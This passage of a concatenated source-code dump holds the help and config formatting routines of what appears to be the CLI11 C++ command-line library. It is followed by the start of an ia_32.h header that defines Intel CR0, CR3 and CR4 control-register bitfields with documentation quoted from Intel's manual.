                    out << '\n' << commentLead << subcom->get_group() << " Options\n";
                }
                /*if (!prefix.empty() || app->get_parent() == nullptr) {
                    out << '[' << prefix << "___"<< subcom->get_group() << "]\n";
                } else {
                    std::string subname = app->get_name() + parentSeparatorChar + "___"+subcom->get_group();
                    const auto *p = app->get_parent();
                    while(p->get_parent() != nullptr) {
                        subname = p->get_name() + parentSeparatorChar +subname;
                        p = p->get_parent();
                    }
                    out << '[' << subname << "]\n";
                }
                */
                out << to_config(subcom, default_also, write_description, prefix);
            }
        }

        for (const App* subcom : subcommands) {
            if (!subcom->get_name().empty()) {
                if (!default_also && (subcom->count_all() == 0)) {
                    continue;
                }
                std::string subname = subcom->get_name();
                clean_name_string(subname, keyChars);

                if (subcom->get_configurable() && (default_also || app->got_subcommand(subcom))) {
                    if (!prefix.empty() || app->get_parent() == nullptr) {

                        out << '[' << prefix << subname << "]\n";
                    }
                    else {
                        std::string appname = app->get_name();
                        clean_name_string(appname, keyChars);
                        subname = appname + parentSeparatorChar + subname;
                        const auto* p = app->get_parent();
                        while (p->get_parent() != nullptr) {
                            std::string pname = p->get_name();
                            clean_name_string(pname, keyChars);
                            subname = pname + parentSeparatorChar + subname;
                            p = p->get_parent();
                        }
                        out << '[' << subname << "]\n";
                    }
                    out << to_config(subcom, default_also, write_description, "");
                }
                else {
                    out << to_config(subcom, default_also, write_description, prefix + subname + parentSeparatorChar);
                }
            }
        }

        if (write_description && !out.str().empty()) {
            std::string outString =
                commentChar + commentLead + detail::fix_newlines(commentChar + commentLead, app->get_description()) + '\n';
            return outString + out.str();
        }
        return out.str();
    }






    CLI11_INLINE std::string
        Formatter::make_group(std::string group, bool is_positional, std::vector<const Option*> opts) const {
        std::stringstream out;

        out << "\n" << group << ":\n";
        for (const Option* opt : opts) {
            out << make_option(opt, is_positional);
        }

        return out.str();
    }

    CLI11_INLINE std::string Formatter::make_positionals(const App* app) const {
        std::vector<const Option*> opts =
            app->get_options([](const Option* opt) { return !opt->get_group().empty() && opt->get_positional(); });

        if (opts.empty())
            return {};

        return make_group(get_label("POSITIONALS"), true, opts);
    }

    CLI11_INLINE std::string Formatter::make_groups(const App* app, AppFormatMode mode) const {
        std::stringstream out;
        std::vector<std::string> groups = app->get_groups();

        // Options
        for (const std::string& group : groups) {
            std::vector<const Option*> opts = app->get_options([app, mode, &group](const Option* opt) {
                return opt->get_group() == group                     // Must be in the right group
                    && opt->nonpositional()                       // Must not be a positional
                    && (mode != AppFormatMode::Sub                // If mode is Sub, then
                        || (app->get_help_ptr() != opt            // Ignore help pointer
                            && app->get_help_all_ptr() != opt));  // Ignore help all pointer
                });
            if (!group.empty() && !opts.empty()) {
                out << make_group(group, false, opts);

                // Removed double newline between groups for consistency of help text
                // if(group != groups.back())
                //    out << "\n";
            }
        }

        return out.str();
    }

    CLI11_INLINE std::string Formatter::make_description(const App* app) const {
        std::string desc = app->get_description();
        auto min_options = app->get_require_option_min();
        auto max_options = app->get_require_option_max();

        if (app->get_required()) {
            desc += " " + get_label("REQUIRED") + " ";
        }

        if (min_options > 0) {
            if (max_options == min_options) {
                desc += " \n[Exactly " + std::to_string(min_options) + " of the following options are required]";
            }
            else if (max_options > 0) {
                desc += " \n[Between " + std::to_string(min_options) + " and " + std::to_string(max_options) +
                    " of the following options are required]";
            }
            else {
                desc += " \n[At least " + std::to_string(min_options) + " of the following options are required]";
            }
        }
        else if (max_options > 0) {
            desc += " \n[At most " + std::to_string(max_options) + " of the following options are allowed]";
        }

        return (!desc.empty()) ? desc + "\n\n" : std::string{};
    }

    CLI11_INLINE std::string Formatter::make_usage(const App* app, std::string name) const {
        std::string usage = app->get_usage();
        if (!usage.empty()) {
            return usage + "\n\n";
        }

        std::stringstream out;
        out << '\n';

        if (name.empty())
            out << get_label("Usage") << ':';
        else
            out << name;

        std::vector<std::string> groups = app->get_groups();

        // Print an Options badge if any options exist
        std::vector<const Option*> non_pos_options =
            app->get_options([](const Option* opt) { return opt->nonpositional(); });
        if (!non_pos_options.empty())
            out << " [" << get_label("OPTIONS") << "]";

        // Positionals need to be listed here
        std::vector<const Option*> positionals = app->get_options([](const Option* opt) { return opt->get_positional(); });

        // Print out positionals if any are left
        if (!positionals.empty()) {
            // Convert to help names
            std::vector<std::string> positional_names(positionals.size());
            std::transform(positionals.begin(), positionals.end(), positional_names.begin(), [this](const Option* opt) {
                return make_option_usage(opt);
                });

            out << " " << detail::join(positional_names, " ");
        }

        // Add a marker if subcommands are expected or optional
        if (!app->get_subcommands(
            [](const CLI::App* subc) { return ((!subc->get_disabled()) && (!subc->get_name().empty())); })
            .empty()) {
            out << ' ' << (app->get_require_subcommand_min() == 0 ? "[" : "")
                << get_label(app->get_require_subcommand_max() < 2 || app->get_require_subcommand_min() > 1 ? "SUBCOMMAND"
                    : "SUBCOMMANDS")
                << (app->get_require_subcommand_min() == 0 ? "]" : "");
        }

        out << "\n\n";

        return out.str();
    }

    CLI11_INLINE std::string Formatter::make_footer(const App* app) const {
        std::string footer = app->get_footer();
        if (footer.empty()) {
            return std::string{};
        }
        return '\n' + footer + "\n\n";
    }

    CLI11_INLINE std::string Formatter::make_help(const App* app, std::string name, AppFormatMode mode) const {
        // This immediately forwards to the make_expanded method. This is done this way so that subcommands can
        // have overridden formatters
        if (mode == AppFormatMode::Sub)
            return make_expanded(app, mode);

        std::stringstream out;
        if ((app->get_name().empty()) && (app->get_parent() != nullptr)) {
            if (app->get_group() != "SUBCOMMANDS") {
                out << app->get_group() << ':';
            }
        }

        detail::streamOutAsParagraph(
            out, make_description(app), description_paragraph_width_, "");  // Format description as paragraph
        out << make_usage(app, name);
        out << make_positionals(app);
        out << make_groups(app, mode);
        out << make_subcommands(app, mode);
        detail::streamOutAsParagraph(out, make_footer(app), footer_paragraph_width_);  // Format footer as paragraph

        return out.str();
    }

    CLI11_INLINE std::string Formatter::make_subcommands(const App* app, AppFormatMode mode) const {
        std::stringstream out;

        std::vector<const App*> subcommands = app->get_subcommands({});

        // Make a list in definition order of the groups seen
        std::vector<std::string> subcmd_groups_seen;
        for (const App* com : subcommands) {
            if (com->get_name().empty()) {
                if (!com->get_group().empty() && com->get_group().front() != '+') {
                    out << make_expanded(com, mode);
                }
                continue;
            }
            std::string group_key = com->get_group();
            if (!group_key.empty() &&
                std::find_if(subcmd_groups_seen.begin(), subcmd_groups_seen.end(), [&group_key](std::string a) {
                    return detail::to_lower(a) == detail::to_lower(group_key);
                    }) == subcmd_groups_seen.end())
                subcmd_groups_seen.push_back(group_key);
        }

        // For each group, filter out and print subcommands
        for (const std::string& group : subcmd_groups_seen) {
            out << '\n' << group << ":\n";
            std::vector<const App*> subcommands_group = app->get_subcommands(
                [&group](const App* sub_app) { return detail::to_lower(sub_app->get_group()) == detail::to_lower(group); });
            for (const App* new_com : subcommands_group) {
                if (new_com->get_name().empty())
                    continue;
                if (mode != AppFormatMode::All) {
                    out << make_subcommand(new_com);
                }
                else {
                    out << new_com->help(new_com->get_name(), AppFormatMode::Sub);
                    out << '\n';
                }
            }
        }

        return out.str();
    }

    CLI11_INLINE std::string Formatter::make_subcommand(const App* sub) const {
        std::stringstream out;
        std::string name = "  " + sub->get_display_name(true) + (sub->get_required() ? " " + get_label("REQUIRED") : "");

        out << std::setw(static_cast<int>(column_width_)) << std::left << name;
        detail::streamOutAsParagraph(
            out, sub->get_description(), right_column_width_, std::string(column_width_, ' '), true);
        out << '\n';
        return out.str();
    }

    CLI11_INLINE std::string Formatter::make_expanded(const App* sub, AppFormatMode mode) const {
        std::stringstream out;
        out << sub->get_display_name(true) << '\n';

        detail::streamOutAsParagraph(
            out, make_description(sub), description_paragraph_width_, "  ");  // Format description as paragraph

        if (sub->get_name().empty() && !sub->get_aliases().empty()) {
            detail::format_aliases(out, sub->get_aliases(), column_width_ + 2);
        }

        out << make_positionals(sub);
        out << make_groups(sub, mode);
        out << make_subcommands(sub, mode);
        detail::streamOutAsParagraph(out, make_footer(sub), footer_paragraph_width_);  // Format footer as paragraph

        out << '\n';
        return out.str();
    }

    CLI11_INLINE std::string Formatter::make_option(const Option* opt, bool is_positional) const {
        std::stringstream out;
        if (is_positional) {
            const std::string left = "  " + make_option_name(opt, true) + make_option_opts(opt);
            const std::string desc = make_option_desc(opt);
            out << std::setw(static_cast<int>(column_width_)) << std::left << left;

            if (!desc.empty()) {
                bool skipFirstLinePrefix = true;
                if (left.length() >= column_width_) {
                    out << '\n';
                    skipFirstLinePrefix = false;
                }
                detail::streamOutAsParagraph(
                    out, desc, right_column_width_, std::string(column_width_, ' '), skipFirstLinePrefix);
            }
        }
        else {
            const std::string namesCombined = make_option_name(opt, false);
            const std::string opts = make_option_opts(opt);
            const std::string desc = make_option_desc(opt);

            // Split all names at comma and sort them into short names and long names
            const auto names = detail::split(namesCombined, ',');
            std::vector<std::string> vshortNames;
            std::vector<std::string> vlongNames;
            std::for_each(names.begin(), names.end(), [&vshortNames, &vlongNames](const std::string& name) {
                if (name.find("--", 0) != std::string::npos)
                    vlongNames.push_back(name);
                else
                    vshortNames.push_back(name);
                });

            // Assemble short and long names
            std::string shortNames = detail::join(vshortNames, ", ");
            std::string longNames = detail::join(vlongNames, ", ");

            // Calculate setw sizes
            const auto shortNamesColumnWidth = static_cast<int>(column_width_ / 3);  // 33% left for short names
            const auto longNamesColumnWidth = static_cast<int>(std::ceil(
                static_cast<float>(column_width_) / 3.0f * 2.0f));  // 66% right for long names and options, ceil result
            int shortNamesOverSize = 0;

            // Print short names
            if (shortNames.length() > 0) {
                shortNames = "  " + shortNames;  // Indent
                if (longNames.length() == 0 && opts.length() > 0)
                    shortNames += opts;  // Add opts if only short names and no long names
                if (longNames.length() > 0)
                    shortNames += ",";
                if (static_cast<int>(shortNames.length()) >= shortNamesColumnWidth) {
                    shortNames += " ";
                    shortNamesOverSize = static_cast<int>(shortNames.length()) - shortNamesColumnWidth;
                }
                out << std::setw(shortNamesColumnWidth) << std::left << shortNames;
            }
            else {
                out << std::setw(shortNamesColumnWidth) << std::left << "";
            }

            // Adjust long name column width in case of short names column reaching into long names column
            shortNamesOverSize =
                (std::min)(shortNamesOverSize, longNamesColumnWidth);  // Prevent negative result with unsigned integers
            const auto adjustedLongNamesColumnWidth = longNamesColumnWidth - shortNamesOverSize;

            // Print long names
            if (longNames.length() > 0) {
                if (opts.length() > 0)
                    longNames += opts;
                if (static_cast<int>(longNames.length()) >= adjustedLongNamesColumnWidth)
                    longNames += " ";

                out << std::setw(adjustedLongNamesColumnWidth) << std::left << longNames;
            }
            else {
                out << std::setw(adjustedLongNamesColumnWidth) << std::left << "";
            }

            if (!desc.empty()) {
                bool skipFirstLinePrefix = true;
                if (out.str().length() > column_width_) {
                    out << '\n';
                    skipFirstLinePrefix = false;
                }
                detail::streamOutAsParagraph(
                    out, desc, right_column_width_, std::string(column_width_, ' '), skipFirstLinePrefix);
            }
        }

        out << '\n';
        return out.str();
    }

    CLI11_INLINE std::string Formatter::make_option_name(const Option* opt, bool is_positional) const {
        if (is_positional)
            return opt->get_name(true, false);

        return opt->get_name(false, true);
    }

    CLI11_INLINE std::string Formatter::make_option_opts(const Option* opt) const {
        std::stringstream out;

        if (!opt->get_option_text().empty()) {
            out << " " << opt->get_option_text();
        }
        else {
            if (opt->get_type_size() != 0) {
                if (!opt->get_type_name().empty())
                    out << " " << get_label(opt->get_type_name());
                if (!opt->get_default_str().empty())
                    out << " [" << opt->get_default_str() << "] ";
                if (opt->get_expected_max() == detail::expected_max_vector_size)
                    out << " ...";
                else if (opt->get_expected_min() > 1)
                    out << " x " << opt->get_expected();

                if (opt->get_required())
                    out << " " << get_label("REQUIRED");
            }
            if (!opt->get_envname().empty())
                out << " (" << get_label("Env") << ":" << opt->get_envname() << ")";
            if (!opt->get_needs().empty()) {
                out << " " << get_label("Needs") << ":";
                for (const Option* op : opt->get_needs())
                    out << " " << op->get_name();
            }
            if (!opt->get_excludes().empty()) {
                out << " " << get_label("Excludes") << ":";
                for (const Option* op : opt->get_excludes())
                    out << " " << op->get_name();
            }
        }
        return out.str();
    }

    CLI11_INLINE std::string Formatter::make_option_desc(const Option* opt) const { return opt->get_description(); }

    CLI11_INLINE std::string Formatter::make_option_usage(const Option* opt) const {
        // Note that these are positionals usages
        std::stringstream out;
        out << make_option_name(opt, true);
        if (opt->get_expected_max() >= detail::expected_max_vector_size)
            out << "...";
        else if (opt->get_expected_max() > 1)
            out << "(" << opt->get_expected() << "x)";

        return opt->get_required() ? out.str() : "[" + out.str() + "]";
    }


} // namespace CLI

```

`client/lib/ia_32.h`:

```h
/** @file */
#pragma once
typedef unsigned char       UINT8;
typedef unsigned short      UINT16;
typedef unsigned int        UINT32;
typedef unsigned long long  UINT64;

#define PAGE_MASK           (PAGE_SIZE - 1)

/**
 * @defgroup INTEL_MANUAL \
 *           Intel Manual
 *
 * @remarks All references are based on <b>Intel(R) 64 and IA-32 architectures software developer's manual combined volumes:
 *          1, 2A, 2B, 2C, 2D, 3A, 3B, 3C, 3D, and 4</b> (May 2018).
 * @{
 */
 /**
  * @defgroup CONTROL_REGISTERS \
  *           Control registers
  *
  * Control registers (CR0, CR1, CR2, CR3, and CR4) determine operating mode of the processor and the characteristics of the
  * currently executing task. These registers are 32 bits in all 32-bit modes and compatibility mode.
  * In 64-bit mode, control registers are expanded to 64 bits. The MOV CRn instructions are used to manipulate the register
  * bits. Operand-size prefixes for these instructions are ignored. The following is also true:
  * - The control registers can be read and loaded (or modified) using the move-to-or-from-control-registers forms of the
  * MOV instruction. In protected mode, the MOV instructions allow the control registers to be read or loaded (at privilege
  * level 0 only). This restriction means that application programs or operating-system procedures (running at privilege
  * levels 1, 2, or 3) are prevented from reading or loading the control registers.
  * - Bits 63:32 of CR0 and CR4 are reserved and must be written with zeros. Writing a nonzero value to any of the upper 32
  * bits results in a general-protection exception, \#GP(0).
  * - All 64 bits of CR2 are writable by software.
  * - Bits 51:40 of CR3 are reserved and must be 0.
  * - The MOV CRn instructions do not check that addresses written to CR2 and CR3 are within the linear-address or
  * physical-address limitations of the implementation.
  * - Register CR8 is available in 64-bit mode only. The control registers are summarized below, and each architecturally
  * defined control field in these control registers is described individually.
  * - CR0 - Contains system control flags that control operating mode and states of the processor.
  * - CR1 - Reserved.
  * - CR2 - Contains the page-fault linear address (the linear address that caused a page fault).
  * - CR3 - Contains the physical address of the base of the paging-structure hierarchy and two flags (PCD and PWT). Only
  * the most-significant bits (less the lower 12 bits) of the base address are specified; the lower 12 bits of the address
  * are assumed to be 0. The first paging structure must thus be aligned to a page (4-KByte) boundary. The PCD and PWT flags
  * control caching of that paging structure in the processor's internal data caches (they do not control TLB caching of
  * page-directory information). When using the physical address extension, the CR3 register contains the base address of
  * the page-directorypointer table. In IA-32e mode, the CR3 register contains the base address of the PML4 table.
  * - CR4 - Contains a group of flags that enable several architectural extensions, and indicate operating system or
  * executive support for specific processor capabilities.
  * - CR8 - Provides read and write access to the Task Priority Register (TPR). It specifies the priority threshold value
  * that operating systems use to control the priority class of external interrupts allowed to interrupt the processor. This
  * register is available only in 64-bit mode. However, interrupt filtering continues to apply in compatibility mode.
  *
  * @see Vol3A[2.5(CONTROL REGISTERS)] (reference)
  * @{
  */
typedef union
{
    struct
    {
        /**
         * @brief Protection Enable
         *
         * [Bit 0] Enables protected mode when set; enables real-address mode when clear. This flag does not enable paging
         * directly. It only enables segment-level protection. To enable paging, both the PE and PG flags must be set.
         *
         * @see Vol3A[9.9(Mode Switching)]
         */
        UINT64 ProtectionEnable : 1;
#define CR0_PROTECTION_ENABLE_BIT                                    0
#define CR0_PROTECTION_ENABLE_FLAG                                   0x01
#define CR0_PROTECTION_ENABLE_MASK                                   0x01
#define CR0_PROTECTION_ENABLE(_)                                     (((_) >> 0) & 0x01)

        /**
         * @brief Monitor Coprocessor
         *
         * [Bit 1] Controls the interaction of the WAIT (or FWAIT) instruction with the TS flag (bit 3 of CR0). If the MP flag is
         * set, a WAIT instruction generates a device-not-available exception (\#NM) if the TS flag is also set. If the MP flag is
         * clear, the WAIT instruction ignores the setting of the TS flag.
         */
        UINT64 MonitorCoprocessor : 1;
#define CR0_MONITOR_COPROCESSOR_BIT                                  1
#define CR0_MONITOR_COPROCESSOR_FLAG                                 0x02
#define CR0_MONITOR_COPROCESSOR_MASK                                 0x01
#define CR0_MONITOR_COPROCESSOR(_)                                   (((_) >> 1) & 0x01)

        /**
         * @brief FPU Emulation
         *
         * [Bit 2] Indicates that the processor does not have an internal or external x87 FPU when set; indicates an x87 FPU is
         * present when clear. This flag also affects the execution of MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instructions.
         * When the EM flag is set, execution of an x87 FPU instruction generates a device-not-available exception (\#NM). This
         * flag must be set when the processor does not have an internal x87 FPU or is not connected to an external math
         * coprocessor. Setting this flag forces all floating-point instructions to be handled by software emulation.
         * Also, when the EM flag is set, execution of an MMX instruction causes an invalid-opcode exception (\#UD) to be
         * generated. Thus, if an IA-32 or Intel 64 processor incorporates MMX technology, the EM flag must be set to 0 to enable
         * execution of MMX instructions. Similarly for SSE/SSE2/SSE3/SSSE3/SSE4 extensions, when the EM flag is set, execution of
         * most SSE/SSE2/SSE3/SSSE3/SSE4 instructions causes an invalid opcode exception (\#UD) to be generated. If an IA-32 or
         * Intel 64 processor incorporates the SSE/SSE2/SSE3/SSSE3/SSE4 extensions, the EM flag must be set to 0 to enable
         * execution of these extensions. SSE/SSE2/SSE3/SSSE3/SSE4 instructions not affected by the EM flag include: PAUSE,
         * PREFETCHh, SFENCE, LFENCE, MFENCE, MOVNTI, CLFLUSH, CRC32, and POPCNT.
         */
        UINT64 EmulateFpu : 1;
#define CR0_EMULATE_FPU_BIT                                          2
#define CR0_EMULATE_FPU_FLAG                                         0x04
#define CR0_EMULATE_FPU_MASK                                         0x01
#define CR0_EMULATE_FPU(_)                                           (((_) >> 2) & 0x01)

        /**
         * @brief Task Switched
         *
         * [Bit 3] Allows the saving of the x87 FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 context on a task switch to be delayed until an
         * x87 FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instruction is actually executed by the new task. The processor sets this flag on
         * every task switch and tests it when executing x87 FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instructions.
         * - If the TS flag is set and the EM flag (bit 2 of CR0) is clear, a device-not-available exception (\#NM) is raised prior
         * to the execution of any x87 FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instruction; with the exception of PAUSE, PREFETCHh,
         * SFENCE, LFENCE, MFENCE, MOVNTI, CLFLUSH, CRC32, and POPCNT.
         * - If the TS flag is set and the MP flag (bit 1 of CR0) and EM flag are clear, an \#NM exception is not raised prior to
         * the execution of an x87 FPU WAIT/FWAIT instruction.
         * - If the EM flag is set, the setting of the TS flag has no effect on the execution of x87
         * FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instructions.
         *   The processor does not automatically save the context of the x87 FPU, XMM, and MXCSR registers on a task switch.
         *   Instead, it sets the TS flag, which causes the processor to raise an \#NM exception whenever it encounters an x87
         *   FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instruction in the instruction stream for the new task (with the exception of the
         *   instructions listed above).
         *   The fault handler for the \#NM exception can then be used to clear the TS flag (with the CLTS instruction) and save
         *   the context of the x87 FPU, XMM, and MXCSR registers. If the task never encounters an x87
         *   FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instruction, the x87 FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 context is never saved.
         */
        UINT64 TaskSwitched : 1;
#define CR0_TASK_SWITCHED_BIT                                        3
#define CR0_TASK_SWITCHED_FLAG                                       0x08
#define CR0_TASK_SWITCHED_MASK                                       0x01
#define CR0_TASK_SWITCHED(_)                                         (((_) >> 3) & 0x01)

        /**
         * @brief Extension Type
         *
         * [Bit 4] Reserved in the Pentium 4, Intel Xeon, P6 family, and Pentium processors. In the Pentium 4, Intel Xeon, and P6
         * family processors, this flag is hardcoded to 1. In the Intel386 and Intel486 processors, this flag indicates support of
         * Intel 387 DX math coprocessor instructions when set.
         */
        UINT64 ExtensionType : 1;
#define CR0_EXTENSION_TYPE_BIT                                       4
#define CR0_EXTENSION_TYPE_FLAG                                      0x10
#define CR0_EXTENSION_TYPE_MASK                                      0x01
#define CR0_EXTENSION_TYPE(_)                                        (((_) >> 4) & 0x01)

        /**
         * @brief Numeric Error
         *
         * [Bit 5] Enables the native (internal) mechanism for reporting x87 FPU errors when set; enables the PC-style x87 FPU
         * error reporting mechanism when clear. When the NE flag is clear and the IGNNE\# input is asserted, x87 FPU errors are
         * ignored. When the NE flag is clear and the IGNNE\# input is deasserted, an unmasked x87 FPU error causes the processor
         * to assert the FERR\# pin to generate an external interrupt and to stop instruction execution immediately before
         * executing the next waiting floating-point instruction or WAIT/FWAIT instruction.
         * The FERR\# pin is intended to drive an input to an external interrupt controller (the FERR\# pin emulates the ERROR\#
         * pin of the Intel 287 and Intel 387 DX math coprocessors). The NE flag, IGNNE\# pin, and FERR\# pin are used with
         * external logic to implement PC-style error reporting. Using FERR\# and IGNNE\# to handle floating-point exceptions is
         * deprecated by modern operating systems; this non-native approach also limits newer processors to operate with one
         * logical processor active.
         *
         * @see Vol1[8.7(Handling x87 FPU Exceptions in Software)]
         * @see Vol1[A.1(APPENDIX A | EFLAGS Cross-Reference)]
         */
        UINT64 NumericError : 1;
#define CR0_NUMERIC_ERROR_BIT                                        5
#define CR0_NUMERIC_ERROR_FLAG                                       0x20
#define CR0_NUMERIC_ERROR_MASK                                       0x01
#define CR0_NUMERIC_ERROR(_)                                         (((_) >> 5) & 0x01)
        UINT64 Reserved1 : 10;

        /**
         * @brief Write Protect
         *
         * [Bit 16] When set, inhibits supervisor-level procedures from writing into readonly pages; when clear, allows
         * supervisor-level procedures to write into read-only pages (regardless of the U/S bit setting). This flag facilitates
         * implementation of the copy-onwrite method of creating a new process (forking) used by operating systems such as UNIX.
         *
         * @see Vol3A[4.1.3(Paging-Mode Modifiers)]
         * @see Vol3A[4.6(ACCESS RIGHTS)]
         */
        UINT64 WriteProtect : 1;
#define CR0_WRITE_PROTECT_BIT                                        16
#define CR0_WRITE_PROTECT_FLAG                                       0x10000
#define CR0_WRITE_PROTECT_MASK                                       0x01
#define CR0_WRITE_PROTECT(_)                                         (((_) >> 16) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * @brief Alignment Mask
         *
         * [Bit 18] Enables automatic alignment checking when set; disables alignment checking when clear. Alignment checking is
         * performed only when the AM flag is set, the AC flag in the EFLAGS register is set, CPL is 3, and the processor is
         * operating in either protected or virtual-8086 mode.
         */
        UINT64 AlignmentMask : 1;
#define CR0_ALIGNMENT_MASK_BIT                                       18
#define CR0_ALIGNMENT_MASK_FLAG                                      0x40000
#define CR0_ALIGNMENT_MASK_MASK                                      0x01
#define CR0_ALIGNMENT_MASK(_)                                        (((_) >> 18) & 0x01)
        UINT64 Reserved3 : 10;

        /**
         * @brief Not Write-through
         *
         * [Bit 29] When the NW and CD flags are clear, write-back (for Pentium 4, Intel Xeon, P6 family, and Pentium processors)
         * or write-through (for Intel486 processors) is enabled for writes that hit the cache and invalidation cycles are enabled.
         */
        UINT64 NotWriteThrough : 1;
#define CR0_NOT_WRITE_THROUGH_BIT                                    29
#define CR0_NOT_WRITE_THROUGH_FLAG                                   0x20000000
#define CR0_NOT_WRITE_THROUGH_MASK                                   0x01
#define CR0_NOT_WRITE_THROUGH(_)                                     (((_) >> 29) & 0x01)

        /**
         * @brief Cache Disable
         *
         * [Bit 30] When the CD and NW flags are clear, caching of memory locations for the whole of physical memory in the
         * processor's internal (and external) caches is enabled. When the CD flag is set, caching is restricted. To prevent the
         * processor from accessing and updating its caches, the CD flag must be set and the caches must be invalidated so that no
         * cache hits can occur.
         *
         * @see Vol3A[11.5.3(Preventing Caching)]
         * @see Vol3A[11.5(CACHE CONTROL)]
         */
        UINT64 CacheDisable : 1;
#define CR0_CACHE_DISABLE_BIT                                        30
#define CR0_CACHE_DISABLE_FLAG                                       0x40000000
#define CR0_CACHE_DISABLE_MASK                                       0x01
#define CR0_CACHE_DISABLE(_)                                         (((_) >> 30) & 0x01)

        /**
         * @brief Paging Enable
         *
         * [Bit 31] Enables paging when set; disables paging when clear. When paging is disabled, all linear addresses are treated
         * as physical addresses. The PG flag has no effect if the PE flag (bit 0 of register CR0) is not also set; setting the PG
         * flag when the PE flag is clear causes a general-protection exception (\#GP).
         * On Intel 64 processors, enabling and disabling IA-32e mode operation also requires modifying CR0.PG.
         *
         * @see Vol3A[4(PAGING)]
         */
        UINT64 PagingEnable : 1;
#define CR0_PAGING_ENABLE_BIT                                        31
#define CR0_PAGING_ENABLE_FLAG                                       0x80000000
#define CR0_PAGING_ENABLE_MASK                                       0x01
#define CR0_PAGING_ENABLE(_)                                         (((_) >> 31) & 0x01)
        UINT64 Reserved4 : 32;
    };

    UINT64 Flags;
} CR0;

typedef union
{
    struct
    {
        UINT64 Reserved1 : 3;

        /**
         * @brief Page-level Write-Through
         *
         * [Bit 3] Controls the memory type used to access the first paging structure of the current paging-structure hierarchy.
         * This bit is not used if paging is disabled, with PAE paging, or with 4-level paging if CR4.PCIDE=1.
         *
         * @see Vol3A[4.9(PAGING AND MEMORY TYPING)]
         */
        UINT64 PageLevelWriteThrough : 1;
#define CR3_PAGE_LEVEL_WRITE_THROUGH_BIT                             3
#define CR3_PAGE_LEVEL_WRITE_THROUGH_FLAG                            0x08
#define CR3_PAGE_LEVEL_WRITE_THROUGH_MASK                            0x01
#define CR3_PAGE_LEVEL_WRITE_THROUGH(_)                              (((_) >> 3) & 0x01)

        /**
         * @brief Page-level Cache Disable
         *
         * [Bit 4] Controls the memory type used to access the first paging structure of the current paging-structure hierarchy.
         * This bit is not used if paging is disabled, with PAE paging, or with 4-level paging2 if CR4.PCIDE=1.
         *
         * @see Vol3A[4.9(PAGING AND MEMORY TYPING)]
         */
        UINT64 PageLevelCacheDisable : 1;
#define CR3_PAGE_LEVEL_CACHE_DISABLE_BIT                             4
#define CR3_PAGE_LEVEL_CACHE_DISABLE_FLAG                            0x10
#define CR3_PAGE_LEVEL_CACHE_DISABLE_MASK                            0x01
#define CR3_PAGE_LEVEL_CACHE_DISABLE(_)                              (((_) >> 4) & 0x01)
        UINT64 Reserved2 : 7;

        /**
         * @brief Address of page directory
         *
         * [Bits 47:12] Physical address of the 4-KByte aligned page directory (32-bit paging) or PML4 table (64-bit paging) used
         * for linear-address translation.
         *
         * @see Vol3A[4.3(32-BIT PAGING)]
         * @see Vol3A[4.5(4-LEVEL PAGING)]
         */
        UINT64 AddressOfPageDirectory : 36;
#define CR3_ADDRESS_OF_PAGE_DIRECTORY_BIT                            12
#define CR3_ADDRESS_OF_PAGE_DIRECTORY_FLAG                           0xFFFFFFFFF000
#define CR3_ADDRESS_OF_PAGE_DIRECTORY_MASK                           0xFFFFFFFFF
#define CR3_ADDRESS_OF_PAGE_DIRECTORY(_)                             (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved3 : 16;
    };

    UINT64 Flags;
} CR3;

typedef union
{
    struct
    {
        /**
         * @brief Virtual-8086 Mode Extensions
         *
         * [Bit 0] Enables interrupt- and exception-handling extensions in virtual-8086 mode when set; disables the extensions when
         * clear. Use of the virtual mode extensions can improve the performance of virtual-8086 applications by eliminating the
         * overhead of calling the virtual- 8086 monitor to handle interrupts and exceptions that occur while executing an 8086
         * program and, instead, redirecting the interrupts and exceptions back to the 8086 program's handlers. It also provides
         * hardware support for a virtual interrupt flag (VIF) to improve reliability of running 8086 programs in multitasking and
         * multiple-processor environments.
         *
         * @see Vol3B[20.3(INTERRUPT AND EXCEPTION HANDLING IN VIRTUAL-8086 MODE)]
         */
        UINT64 VirtualModeExtensions : 1;
#define CR4_VIRTUAL_MODE_EXTENSIONS_BIT                              0
#define CR4_VIRTUAL_MODE_EXTENSIONS_FLAG                             0x01
#define CR4_VIRTUAL_MODE_EXTENSIONS_MASK                             0x01
#define CR4_VIRTUAL_MODE_EXTENSIONS(_)                               (((_) >> 0) & 0x01)

        /**
         * @brief Protected-Mode Virtual Interrupts
         *
         * [Bit 1] Enables hardware support for a virtual interrupt flag (VIF) in protected mode when set; disables the VIF flag in
         * protected mode when clear.
         *
         * @see Vol3B[20.4(PROTECTED-MODE VIRTUAL INTERRUPTS)]
         */
        UINT64 ProtectedModeVirtualInterrupts : 1;
#define CR4_PROTECTED_MODE_VIRTUAL_INTERRUPTS_BIT                    1
#define CR4_PROTECTED_MODE_VIRTUAL_INTERRUPTS_FLAG                   0x02
#define CR4_PROTECTED_MODE_VIRTUAL_INTERRUPTS_MASK                   0x01
#define CR4_PROTECTED_MODE_VIRTUAL_INTERRUPTS(_)                     (((_) >> 1) & 0x01)

        /**
         * @brief Time Stamp Disable
         *
         * [Bit 2] Restricts the execution of the RDTSC instruction to procedures running at privilege level 0 when set; allows
         * RDTSC instruction to be executed at any privilege level when clear. This bit also applies to the RDTSCP instruction if
         * supported (if CPUID.80000001H:EDX[27] = 1).
         */
        UINT64 TimestampDisable : 1;
#define CR4_TIMESTAMP_DISABLE_BIT                                    2
#define CR4_TIMESTAMP_DISABLE_FLAG                                   0x04
#define CR4_TIMESTAMP_DISABLE_MASK                                   0x01
#define CR4_TIMESTAMP_DISABLE(_)                                     (((_) >> 2) & 0x01)

        /**
         * @brief Debugging Extensions
         *
         * [Bit 3] References to debug registers DR4 and DR5 cause an undefined opcode (\#UD) exception to be generated when set;
         * when clear, processor aliases references to registers DR4 and DR5 for compatibility with software written to run on
         * earlier IA-32 processors.
         *
         * @see Vol3B[17.2.2(Debug Registers DR4 and DR5)]
         */
        UINT64 DebuggingExtensions : 1;
